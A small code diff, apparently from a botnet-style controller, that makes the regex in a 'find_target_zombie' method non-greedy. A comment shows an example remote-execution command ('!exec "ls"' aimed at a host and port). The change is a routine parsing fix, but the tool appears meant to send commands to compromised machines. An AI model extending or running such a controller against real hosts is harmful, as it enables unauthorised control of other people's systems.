@@ -147,7 +147,7 @@ Select Target           ---> -h "TARGET"
 
     def find_target_zombie(self):
         # !exec "ls" -h "192.168.10.25:52000"
-        get_host_pattern = r' -h "(.*)"'
+        get_host_pattern = r' -h "(.*?)"'
         host_from_command = re.findall(get_host_pattern, self.command)
         if len(host_from_command) > 0:
             return host_from_command
